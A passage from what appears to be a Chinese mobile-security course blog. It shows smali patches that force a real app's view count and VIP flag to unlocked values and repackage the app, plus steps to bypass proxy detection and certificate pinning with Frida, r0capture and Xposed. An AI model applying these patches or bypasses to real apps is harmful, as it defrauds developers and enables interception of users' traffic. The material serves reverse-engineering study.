title="对于观看次数："></a>对于观看次数：</h5><p>逻辑：修改手机型号</p><p>smali数据类型，所以下面的v0是一个方法，寄存器</p><p><img src="/../images/Day69-APP%E6%94%BB%E9%98%B2-%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9F%A5%E5%A3%B3%E8%84%B1%E5%A3%B3-%E9%87%8D%E6%89%93%E5%8C%85%E7%AD%BE%E5%90%8D-%E4%BF%AE%E6%94%B9%E6%AC%A1%E6%95%B0%E4%BC%9A%E5%91%98%E7%89%88%E6%9D%83%E9%99%90%E5%88%B6/image-20230317135151455.png" alt="image-20230317135151455"></p><blockquote><p>.method public getRe_today_view_times()Ljava&#x2F;lang&#x2F;String;</p><p>​    .locals 1</p><p>​    .line 307</p><p>​    iget-object v0, p0, Lcom&#x2F;ufozfnxzqm&#x2F;dvbphwfo&#x2F;entity&#x2F;UserInfo;-&gt;re_today_view_times:Ljava&#x2F;lang&#x2F;String;</p><p>​    const-string v0, “9999999”  （加上这行代码，把v0赋值为9999999，这里v0默认等于10）</p><p>​    return-object v0</p><p>.end method</p><p><img src="/../images/Day69-APP%E6%94%BB%E9%98%B2-%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9F%A5%E5%A3%B3%E8%84%B1%E5%A3%B3-%E9%87%8D%E6%89%93%E5%8C%85%E7%AD%BE%E5%90%8D-%E4%BF%AE%E6%94%B9%E6%AC%A1%E6%95%B0%E4%BC%9A%E5%91%98%E7%89%88%E6%9D%83%E9%99%90%E5%88%B6/image-20230317134920022.png" alt="image-20230317134920022"></p></blockquote><p>java中的代码</p><p><img src="/../images/Day69-APP%E6%94%BB%E9%98%B2-%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9F%A5%E5%A3%B3%E8%84%B1%E5%A3%B3-%E9%87%8D%E6%89%93%E5%8C%85%E7%AD%BE%E5%90%8D-%E4%BF%AE%E6%94%B9%E6%AC%A1%E6%95%B0%E4%BC%9A%E5%91%98%E7%89%88%E6%9D%83%E9%99%90%E5%88%B6/image-20230317133832709.png" alt="image-20230317133832709"></p><p>这个smali里面的代码对应上面的java的代码，即下面栏目右边里面的，修改后点右上角保存</p><p><img src="/../images/Day69-APP%E6%94%BB%E9%98%B2-%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9F%A5%E5%A3%B3%E8%84%B1%E5%A3%B3-%E9%87%8D%E6%89%93%E5%8C%85%E7%AD%BE%E5%90%8D-%E4%BF%AE%E6%94%B9%E6%AC%A1%E6%95%B0%E4%BC%9A%E5%91%98%E7%89%88%E6%9D%83%E9%99%90%E5%88%B6/image-20230317134205336.png" alt="image-20230317134205336"></p><p>直接点项目打包就可以了</p><p><img src="/../images/Day69-APP%E6%94%BB%E9%98%B2-%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9F%A5%E5%A3%B3%E8%84%B1%E5%A3%B3-%E9%87%8D%E6%89%93%E5%8C%85%E7%AD%BE%E5%90%8D-%E4%BF%AE%E6%94%B9%E6%AC%A1%E6%95%B0%E4%BC%9A%E5%91%98%E7%89%88%E6%9D%83%E9%99%90%E5%88%B6/image-20230317135746055.png" alt="image-20230317135746055"></p><p>点击否</p><p><img src="/../images/Day69-APP%E6%94%BB%E9%98%B2-%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9F%A5%E5%A3%B3%E8%84%B1%E5%A3%B3-%E9%87%8D%E6%89%93%E5%8C%85%E7%AD%BE%E5%90%8D-%E4%BF%AE%E6%94%B9%E6%AC%A1%E6%95%B0%E4%BC%9A%E5%91%98%E7%89%88%E6%9D%83%E9%99%90%E5%88%B6/image-20230317135910376.png" alt="image-20230317135910376"></p><p>再点是</p><p><img src="/../images/Day69-APP%E6%94%BB%E9%98%B2-%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9F%A5%E5%A3%B3%E8%84%B1%E5%A3%B3-%E9%87%8D%E6%89%93%E5%8C%85%E7%AD%BE%E5%90%8D-%E4%BF%AE%E6%94%B9%E6%AC%A1%E6%95%B0%E4%BC%9A%E5%91%98%E7%89%88%E6%9D%83%E9%99%90%E5%88%B6/image-20230317135934918.png" alt="image-20230317135934918"></p><p>再点否并保存于本地</p><p><img src="/../images/Day69-APP%E6%94%BB%E9%98%B2-%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9F%A5%E5%A3%B3%E8%84%B1%E5%A3%B3-%E9%87%8D%E6%89%93%E5%8C%85%E7%AD%BE%E5%90%8D-%E4%BF%AE%E6%94%B9%E6%AC%A1%E6%95%B0%E4%BC%9A%E5%91%98%E7%89%88%E6%9D%83%E9%99%90%E5%88%B6/image-20230317140002751.png" alt="image-20230317140002751"></p><p>打开app发现次数更改了</p><p><img src="/../images/Day69-APP%E6%94%BB%E9%98%B2-%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9F%A5%E5%A3%B3%E8%84%B1%E5%A3%B3-%E9%87%8D%E6%89%93%E5%8C%85%E7%AD%BE%E5%90%8D-%E4%BF%AE%E6%94%B9%E6%AC%A1%E6%95%B0%E4%BC%9A%E5%91%98%E7%89%88%E6%9D%83%E9%99%90%E5%88%B6/image-20230317140041053.png" alt="image-20230317140041053"></p><h5 id="对于会员："><a href="#对于会员：" class="headerlink" title="对于会员："></a>对于会员：</h5><blockquote><p>.method public getIs_vip()I</p><p>  .locals 1</p><p>  .line 347</p><p>  iget v0, p0, Lcom&#x2F;ufozfnxzqm&#x2F;dvbphwfo&#x2F;entity&#x2F;UserInfo;-&gt;is_vip:I</p><p>  const&#x2F;4 v0, 0x1</p><p>  return v0</p><p>.end method</p><p><img src="/../images/Day69-APP%E6%94%BB%E9%98%B2-%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9F%A5%E5%A3%B3%E8%84%B1%E5%A3%B3-%E9%87%8D%E6%89%93%E5%8C%85%E7%AD%BE%E5%90%8D-%E4%BF%AE%E6%94%B9%E6%AC%A1%E6%95%B0%E4%BC%9A%E5%91%98%E7%89%88%E6%9D%83%E9%99%90%E5%88%B6/image-20230317140907597.png" alt="image-20230317140907597"></p></blockquote><p><img src="/../images/Day69-APP%E6%94%BB%E9%98%B2-%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9F%A5%E5%A3%B3%E8%84%B1%E5%A3%B3-%E9%87%8D%E6%89%93%E5%8C%85%E7%AD%BE%E5%90%8D-%E4%BF%AE%E6%94%B9%E6%AC%A1%E6%95%B0%E4%BC%9A%E5%91%98%E7%89%88%E6%9D%83%E9%99%90%E5%88%B6/image-20230317140427929.png" alt="image-20230317140427929"></p><p>此处等于1就判定为是会员</p><p><img src="/../images/Day69-APP%E6%94%BB%E9%98%B2-%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9F%A5%E5%A3%B3%E8%84%B1%E5%A3%B3-%E9%87%8D%E6%89%93%E5%8C%85%E7%AD%BE%E5%90%8D-%E4%BF%AE%E6%94%B9%E6%AC%A1%E6%95%B0%E4%BC%9A%E5%91%98%E7%89%88%E6%9D%83%E9%99%90%E5%88%B6/image-20230317140645882.png" alt="image-20230317140645882"></p><p>继续回到smali代码的userinfo.sam里面，在中间加上如下代码，将其赋值为1</p><p><img src="/../images/Day69-APP%E6%94%BB%E9%98%B2-%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9F%A5%E5%A3%B3%E8%84%B1%E5%A3%B3-%E9%87%8D%E6%89%93%E5%8C%85%E7%AD%BE%E5%90%8D-%E4%BF%AE%E6%94%B9%E6%AC%A1%E6%95%B0%E4%BC%9A%E5%91%98%E7%89%88%E6%9D%83%E9%99%90%E5%88%B6/image-20230317140833692.png" alt="image-20230317140833692"></p><p>保存打包后打开app，成功修改</p><p><img src="/../images/Day69-APP%E6%94%BB%E9%98%B2-%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9F%A5%E5%A3%B3%E8%84%B1%E5%A3%B3-%E9%87%8D%E6%89%93%E5%8C%85%E7%AD%BE%E5%90%8D-%E4%BF%AE%E6%94%B9%E6%AC%A1%E6%95%B0%E4%BC%9A%E5%91%98%E7%89%88%E6%9D%83%E9%99%90%E5%88%B6/image-20230317141105112.png" alt="image-20230317141105112"></p><p>安卓修改大师还可以增加各种广告插件，替换应用图标等</p><p><img src="/../images/Day69-APP%E6%94%BB%E9%98%B2-%E5%8F%8D%E7%BC%96%E8%AF%91-%E6%9F%A5%E5%A3%B3%E8%84%B1%E5%A3%B3-%E9%87%8D%E6%89%93%E5%8C%85%E7%AD%BE%E5%90%8D-%E4%BF%AE%E6%94%B9%E6%AC%A1%E6%95%B0%E4%BC%9A%E5%91%98%E7%89%88%E6%9D%83%E9%99%90%E5%88%B6/image-20230317141335876.png" alt="image-20230317141335876"></p><h4 id="安卓修改大师功能修改-反编译-amp-图标-amp-信息"><a href="#安卓修改大师功能修改-反编译-amp-图标-amp-信息" class="headerlink" title="#安卓修改大师功能修改-反编译&amp;图标&amp;信息"></a>#安卓修改大师功能修改-反编译&amp;图标&amp;信息</h4><h4 id="安卓修改大师打包编译-证书签名-amp-重打包等"><a href="#安卓修改大师打包编译-证书签名-amp-重打包等" class="headerlink" title="#安卓修改大师打包编译-证书签名&amp;重打包等"></a>#安卓修改大师打包编译-证书签名&amp;重打包等</h4><h5 id="安卓修改大师-替换图标-amp-修改信息"><a href="#安卓修改大师-替换图标-amp-修改信息" class="headerlink" title="安卓修改大师-替换图标&amp;修改信息"></a>安卓修改大师-替换图标&amp;修改信息</h5><h5 id="安卓修改大师-证书自带-amp-重打包选择"><a href="#安卓修改大师-证书自带-amp-重打包选择" class="headerlink" title="安卓修改大师-证书自带&amp;重打包选择"></a>安卓修改大师-证书自带&amp;重打包选择</h5>]]></content>
      
      
      <categories>
          
          <category> APP攻防 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day68 APP攻防-Xposed&amp;Frida&amp;Hook&amp;证书校验&amp;反代理&amp;代理转发</title>
      <link href="/2023/03/15/Day68-APP%E6%94%BB%E9%98%B2-Xposed-Frida-Hook-%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C-%E5%8F%8D%E4%BB%A3%E7%90%86-%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/"/>
      <url>/2023/03/15/Day68-APP%E6%94%BB%E9%98%B2-Xposed-Frida-Hook-%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C-%E5%8F%8D%E4%BB%A3%E7%90%86-%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/</url>
      
        <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、资产提取-AppinfoScanner </p><p>2、评估框架-MobSF&amp;mobexler</p><p>3、抓包利器-Frida&amp;r0capture</p><h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>1、信息收集-应用&amp;资产提取&amp;权限等</p><p>2、漏洞发现-反编译&amp;脱壳&amp;代码审计</p><p>3、安全评估-组件&amp;敏感密匙&amp;恶意分析</p><h3 id="核心点："><a href="#核心点：" class="headerlink" title="#核心点："></a>#核心点：</h3><p>1、内在点-资产提取&amp;版本&amp;信息等</p><p>2、抓包点-反代理&amp;反证书&amp;协议等</p><p>3、逆向点-反编译&amp;脱壳&amp;重打包等</p><p>4、安全点-资产&amp;接口&amp;漏洞&amp;审计等</p><blockquote><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ 某牛牛防抓包-xposed&amp;frida&amp;r0capture</p><p>➢ 某社交防抓包-Proxifier&amp;frida&amp;r0capture</p></blockquote><h4 id="反代理绕过："><a href="#反代理绕过：" class="headerlink" title="-反代理绕过："></a>-反代理绕过：</h4><p><img src="/../images/Day68-APP%E6%94%BB%E9%98%B2-Xposed-Frida-Hook-%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C-%E5%8F%8D%E4%BB%A3%E7%90%86-%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/image-20230317102148129.png" alt="image-20230317102148129"></p><p><a href="https://zone.huoxian.cn/d/440-app">APP抓包问题总结及常见绕过方法 - 火线 Zone-云安全社区 (huoxian.cn)</a></p><h6 id="1、自身的抓包应用"><a href="#1、自身的抓包应用" class="headerlink" title="1、自身的抓包应用"></a>1、自身的抓包应用</h6><p><img src="/../images/Day68-APP%E6%94%BB%E9%98%B2-Xposed-Frida-Hook-%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C-%E5%8F%8D%E4%BB%A3%E7%90%86-%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/image-20230317104640260.png" alt="image-20230317104640260"></p><p>如果这种自带的抓包工具抓不到说明有是反代理的</p><h6 id="2、Proxifier转发使用"><a href="#2、Proxifier转发使用" class="headerlink" title="2、Proxifier转发使用"></a>2、Proxifier转发使用</h6><p><img src="/../images/Day68-APP%E6%94%BB%E9%98%B2-Xposed-Frida-Hook-%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C-%E5%8F%8D%E4%BB%A3%E7%90%86-%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/image-20230317102705636.png" alt="image-20230317102705636"></p><p>Proxifier配置代理，保持和burp的端口一样</p><p><img src="/../images/Day68-APP%E6%94%BB%E9%98%B2-Xposed-Frida-Hook-%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C-%E5%8F%8D%E4%BB%A3%E7%90%86-%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/image-20230317103233973.png" alt="image-20230317103233973"></p><p>模拟器网络出口应用</p><p><img src="/../images/Day68-APP%E6%94%BB%E9%98%B2-Xposed-Frida-Hook-%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C-%E5%8F%8D%E4%BB%A3%E7%90%86-%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/image-20230317103000616.png" alt="image-20230317103000616"></p><p>还有其本身应用，选择这两个加入代理规则，配置完后burp里面抓到的这两个的数据包会转发到这里</p><p><img src="/../images/Day68-APP%E6%94%BB%E9%98%B2-Xposed-Frida-Hook-%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C-%E5%8F%8D%E4%BB%A3%E7%90%86-%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/image-20230317103118683.png" alt="image-20230317103118683"></p><p>通过抓取应用，发现了三个一闪而过又消失的数据包</p><p><img src="/../images/Day68-APP%E6%94%BB%E9%98%B2-Xposed-Frida-Hook-%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C-%E5%8F%8D%E4%BB%A3%E7%90%86-%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/image-20230317103727925.png" alt="image-20230317103727925"></p><p>当把Proxifier代理关闭时，再用burp抓包，什么都没有出现，对比说明了Proxifier绕过了代理，而且时双层检测（代理检测和证书检测），断定那三个一闪而过的数据包是证书检测发出来的</p><p><img src="/../images/Day68-APP%E6%94%BB%E9%98%B2-Xposed-Frida-Hook-%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C-%E5%8F%8D%E4%BB%A3%E7%90%86-%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/image-20230317103828283.png" alt="image-20230317103828283"></p><p>所以总结出：</p><p><img src="/../images/Day68-APP%E6%94%BB%E9%98%B2-Xposed-Frida-Hook-%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C-%E5%8F%8D%E4%BB%A3%E7%90%86-%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/image-20230317104457133.png" alt="image-20230317104457133"></p><p>其次使用Proxifier时会产生数据包的，在需要证书校验的情况下，Proxifier只能反代理</p><p><img src="/../images/Day68-APP%E6%94%BB%E9%98%B2-Xposed-Frida-Hook-%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C-%E5%8F%8D%E4%BB%A3%E7%90%86-%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/image-20230317114959852.png" alt="image-20230317114959852"></p><h4 id="证书校验绕过："><a href="#证书校验绕过：" class="headerlink" title="-证书校验绕过："></a>-证书校验绕过：</h4><p>情况1，客户端不存在证书校验，服务器也不存在证书校验。</p><p>情况2，客户端存在校验服务端证书，服务器也不存在证书校验，单项校验。</p><p>情况3、客户端存在证书校验，服务器也存在证书校验，双向校验。</p><h6 id="1、Frida-amp-r0capture底层（通杀，绕双向）缺点是不能改包"><a href="#1、Frida-amp-r0capture底层（通杀，绕双向）缺点是不能改包" class="headerlink" title="1、Frida&amp;r0capture底层（通杀，绕双向）缺点是不能改包"></a>1、Frida&amp;r0capture底层（通杀，绕双向）缺点是不能改包</h6><p>出现不能连接问题，所以启动之前还是先用命令frida-ps -R测试一下</p><p><img src="/../images/Day68-APP%E6%94%BB%E9%98%B2-Xposed-Frida-Hook-%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C-%E5%8F%8D%E4%BB%A3%E7%90%86-%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/image-20230317112121717.png" alt="image-20230317112121717"></p><p>转发一下，上节课讲过，如果启动还是失败显示<strong>应用已经停止运行</strong>，<strong>那么就卸载XP框架重启就可以了</strong></p><p><img src="/../images/Day68-APP%E6%94%BB%E9%98%B2-Xposed-Frida-Hook-%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C-%E5%8F%8D%E4%BB%A3%E7%90%86-%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/image-20230317112333148.png" alt="image-20230317112333148"></p><h6 id="2、Xposed-amp-JustTrust-amp-HOOK（大部分，绕单向）"><a href="#2、Xposed-amp-JustTrust-amp-HOOK（大部分，绕单向）" class="headerlink" title="2、Xposed&amp;JustTrust&amp;HOOK（大部分，绕单向）"></a>2、Xposed&amp;JustTrust&amp;HOOK（大部分，绕单向）</h6><p>安装Xposed后安装这两个，安装后重启，如果什么都输入不了就再次重启</p><p><img src="/../images/Day68-APP%E6%94%BB%E9%98%B2-Xposed-Frida-Hook-%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C-%E5%8F%8D%E4%BB%A3%E7%90%86-%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/image-20230317105147891.png" alt="image-20230317105147891"></p><p>勾选上重启</p><p><img src="/../images/Day68-APP%E6%94%BB%E9%98%B2-Xposed-Frida-Hook-%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C-%E5%8F%8D%E4%BB%A3%E7%90%86-%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/image-20230317105042291.png" alt="image-20230317105042291"></p><p><img src="/../images/Day68-APP%E6%94%BB%E9%98%B2-Xposed-Frida-Hook-%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C-%E5%8F%8D%E4%BB%A3%E7%90%86-%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/image-20230317110141551.png" alt="image-20230317110141551"></p><p>但是当用XP框架尝试绕过tantan时显示如下，但是版本却是最新的，这是因为有检测，不让登录，这说明tantan的证书是双向验证，而上面演示的软件是单向的</p><p><img src="/../images/Day68-APP%E6%94%BB%E9%98%B2-Xposed-Frida-Hook-%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C-%E5%8F%8D%E4%BB%A3%E7%90%86-%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/image-20230317123313946.png" alt="image-20230317123313946"></p><h6 id="3、反编译逆向提取证书重编打包"><a href="#3、反编译逆向提取证书重编打包" class="headerlink" title="3、反编译逆向提取证书重编打包"></a>3、反编译逆向提取证书重编打包</h6><p>用这个方法可以修改证书或者删除证书校验从而绕过，从而可以实现burp抓包可以修改，方法最难但是最有效</p><h6 id="4、反虚拟机"><a href="#4、反虚拟机" class="headerlink" title="4、反虚拟机"></a>4、反虚拟机</h6><p>当某软件在逍遥模拟器打开时显示</p><p><img src="/../images/Day68-APP%E6%94%BB%E9%98%B2-Xposed-Frida-Hook-%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C-%E5%8F%8D%E4%BB%A3%E7%90%86-%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/image-20230317124108851.png" alt="image-20230317124108851"></p><p>而在夜神模拟器却能正常打开，是因为两者内核不一样，在夜神上运行会以为它就是手机真机，<strong>所以如果遇到这种反虚拟机的情况，使用夜神模拟器或者使用XP框</strong>架</p><p><img src="/../images/Day68-APP%E6%94%BB%E9%98%B2-Xposed-Frida-Hook-%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C-%E5%8F%8D%E4%BB%A3%E7%90%86-%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/image-20230317124151914.png" alt="image-20230317124151914"></p><p><strong>burp抓取不了非web协议的东西，所以即使绕过了所有检测，像app使用tcp传送的数据包就抓不到，只能使用wireshark配合Frida&amp;r0capture</strong></p><p><img src="/../images/Day68-APP%E6%94%BB%E9%98%B2-Xposed-Frida-Hook-%E8%AF%81%E4%B9%A6%E6%A0%A1%E9%AA%8C-%E5%8F%8D%E4%BB%A3%E7%90%86-%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/image-20230317125423260.png" alt="image-20230317125423260"></p>]]></content>
      
      
      <categories>
          
          <category> APP攻防 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day67 APP攻防-Frida反证书抓包&amp;移动安全系统&amp;资产提取&amp;评估扫描</title>
      <link href="/2023/03/15/Day67-APP%E6%94%BB%E9%98%B2-Frida%E5%8F%8D%E8%AF%81%E4%B9%A6%E6%8A%93%E5%8C%85-%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-%E8%B5%84%E4%BA%A7%E6%8F%90%E5%8F%96-%E8%AF%84%E4%BC%B0%E6%89%AB%E6%8F%8F/"/>
      <url>/2023/03/15/Day67-APP%E6%94%BB%E9%98%B2-Frida%E5%8F%8D%E8%AF%81%E4%B9%A6%E6%8A%93%E5%8C%85-%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-%E8%B5%84%E4%BA%A7%E6%8F%90%E5%8F%96-%E8%AF%84%E4%BC%B0%E6%89%AB%E6%8F%8F/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/Day67-APP%E6%94%BB%E9%98%B2-Frida%E5%8F%8D%E8%AF%81%E4%B9%A6%E6%8A%93%E5%8C%85-%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-%E8%B5%84%E4%BA%A7%E6%8F%90%E5%8F%96-%E8%AF%84%E4%BC%B0%E6%89%AB%E6%8F%8F/cV0ekQ4B_0Mwwj4fj7_R5w.png" alt="img"></p><h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、资产提取-AppinfoScanner </p><p>2、评估框架-MobSF&amp;mobexler</p><p>3、抓包利器-Frida&amp;r0capture</p><h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>1、信息收集-应用&amp;资产提取&amp;权限等</p><p>2、漏洞发现-反编译&amp;脱壳&amp;代码审计</p><p>3、安全评估-组件&amp;敏感密匙&amp;恶意分析</p><h3 id="核心点："><a href="#核心点：" class="headerlink" title="#核心点："></a>#核心点：</h3><p>1、内在点-资产提取&amp;版本&amp;信息等</p><p>2、抓包点-反代理&amp;反证书&amp;协议等</p><p>3、逆向点-反编译&amp;脱壳&amp;重打包等</p><p>4、安全点-资产&amp;接口&amp;漏洞&amp;审计等</p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p><a href="https://www.ddosi.org/app-packet-captures/">APP各种抓包教程 Hook | SSL Pinning |Frida - 🔰雨苁ℒ🔰 (ddosi.org)</a></p><p>➢ 内在-资产提取-AppinfoScanner</p><p>➢ 内在-安全评估-MobSF&amp;mobexler</p><p>➢ 外在-证书抓包-Frida-server&amp;r0capture</p><h4 id="内在-资产提取-AppinfoScanner"><a href="#内在-资产提取-AppinfoScanner" class="headerlink" title="#内在-资产提取-AppinfoScanner"></a>#内在-资产提取-AppinfoScanner</h4><p>AppinfoScanner一款适用于以HW行动&#x2F;红队&#x2F;渗透测试团队为场景的移动端(Android、iOS、WEB、H5、静态网站)信息收集扫描工具，可以帮助渗透测试工程师、攻击队成员、红队成员快速收集到移动端或者静态WEB站点中关键的资产信息并提供基本的信息输出,如：Title、Domain、CDN、指纹信息、状态信息等。</p><p><a href="https://github.com/kelvinBen/AppInfoScanner">https://github.com/kelvinBen/AppInfoScanner</a></p><p>1、apk提取是从代码里面提取一些特征地址</p><p>2、抓包是外在表现抓包</p><h4 id="内在-安全评估-MobSF-amp-mobexler"><a href="#内在-安全评估-MobSF-amp-mobexler" class="headerlink" title="#内在-安全评估-MobSF&amp;mobexler"></a>#内在-安全评估-MobSF&amp;mobexler</h4><h5 id="MobSF"><a href="#MobSF" class="headerlink" title="MobSF"></a>MobSF</h5><p>-移动安全框架 (MobSF) 是一种自动化的一体化移动应用程序 (Android&#x2F;iOS&#x2F;Windows) 渗透测试、恶意软件分析和安全评估框架，能够执行静态和动态分析。MobSF 支持移动应用程序二进制文件（APK、XAPK、IPA 和 APPX）以及压缩源代码，并提供 REST API 以与您的 CI&#x2F;CD 或 DevSecOps 管道无缝集成。动态分析器可帮助您执行运行时安全评估和交互式仪器测试。</p><p><img src="/../images/Day67-APP%E6%94%BB%E9%98%B2-Frida%E5%8F%8D%E8%AF%81%E4%B9%A6%E6%8A%93%E5%8C%85-%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-%E8%B5%84%E4%BA%A7%E6%8F%90%E5%8F%96-%E8%AF%84%E4%BC%B0%E6%89%AB%E6%8F%8F/image-20230316181622924.png" alt="image-20230316181622924"></p><p>可以检测apk里面的代码和功能</p><p><img src="/../images/Day67-APP%E6%94%BB%E9%98%B2-Frida%E5%8F%8D%E8%AF%81%E4%B9%A6%E6%8A%93%E5%8C%85-%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-%E8%B5%84%E4%BA%A7%E6%8F%90%E5%8F%96-%E8%AF%84%E4%BC%B0%E6%89%AB%E6%8F%8F/image-20230317124515210.png" alt="image-20230317124515210"></p><h5 id="Mobexler"><a href="#Mobexler" class="headerlink" title="Mobexler"></a>Mobexler</h5><p>-Mobexler是基于Elementary OS的定制虚拟机，旨在帮助进行Android和iOS应用程序的渗透测试。Mobexler预装了各种开源工具，脚本，黑客必备软件等，这些都是安全测试Android和iOS应用程序所必需的。</p><p>1、mobexler：<a href="https://mobexler.com/%EF%BC%88%E6%B8%97%E9%80%8F%E7%B3%BB%E7%BB%9F%EF%BC%89">https://mobexler.com/（渗透系统）</a></p><p>2、MobSF：<a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF">https://github.com/MobSF/Mobile-Security-Framework-MobSF</a></p><p>docker pull opensecurity&#x2F;mobile-security-framework-mobsf</p><p>docker run -it -p 8008:8000 opensecurity&#x2F;mobile-security-framework-mobsf:latest</p><h4 id="外在-证书抓包-frida-server-amp-r0capture"><a href="#外在-证书抓包-frida-server-amp-r0capture" class="headerlink" title="#外在-证书抓包-frida-server&amp;r0capture"></a>#外在-证书抓包-frida-server&amp;r0capture</h4><p><strong>r0capture</strong>  仅限安卓平台，测试安卓7、8、9、10、11 可用 ；（夜神模拟器可修改版本）</p><blockquote><p>无视所有证书校验或绑定，不用考虑任何证书的事情；</p><p>通杀TCP&#x2F;IP四层模型中的应用层中的全部协议；</p><p>通杀协议包括：Http,WebSocket,Ftp,Xmpp,Imap,Smtp,Protobuf等、及它们的SSL版本；</p><p>通杀所有应用层框架，包括HttpUrlConnection、Okhttp1&#x2F;3&#x2F;4、Retrofit&#x2F;Volley等等；</p><p>无视加固，不管是整体壳还是二代壳或VMP，不用考虑加固的事情；</p><p>抓包：</p><p>抓的到和抓不到</p><p>抓不到：1、没走http&#x2F;https协议-其他协议全局抓包 2、反代理或证书校验的检测 防抓包机制</p></blockquote><h5 id="Firda"><a href="#Firda" class="headerlink" title="Firda"></a>Firda</h5><p>一款易用的跨平 Hook 工具， Java 层到 Native 层的 Hook 无所不能，是一种 动态 的插桩工具，可以插入代码到原生 App 的内存空间中，动态的去监视和修改行为，原生平台包括 Win、Mac、Linux、Android、iOS 全平台。</p><p>测试环境：</p><p>Windows10  Python3.7 夜神模拟器 r0capture frida-server wireshark</p><p><a href="https://github.com/r0ysue/r0capture">https://github.com/r0ysue/r0capture</a></p><p><a href="https://github.com/frida/frida/releases">https://github.com/frida/frida/releases</a></p><p><img src="/../images/Day67-APP%E6%94%BB%E9%98%B2-Frida%E5%8F%8D%E8%AF%81%E4%B9%A6%E6%8A%93%E5%8C%85-%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-%E8%B5%84%E4%BA%A7%E6%8F%90%E5%8F%96-%E8%AF%84%E4%BC%B0%E6%89%AB%E6%8F%8F/image-20230317000602318.png" alt="image-20230317000602318"></p><p><a href="https://blog.csdn.net/qq_18893835/article/details/121461497">(22条消息) 【教程】Fiddler真机模拟器抓包+frida突破ssl pinning_frida抓包_痞老板2的博客-CSDN博客</a></p><h6 id="1、本地安装Frida"><a href="#1、本地安装Frida" class="headerlink" title="1、本地安装Frida"></a>1、本地安装Frida</h6><p>pip install frida</p><p>pip install frida-tools</p><h6 id="2、模拟器安装Frida"><a href="#2、模拟器安装Frida" class="headerlink" 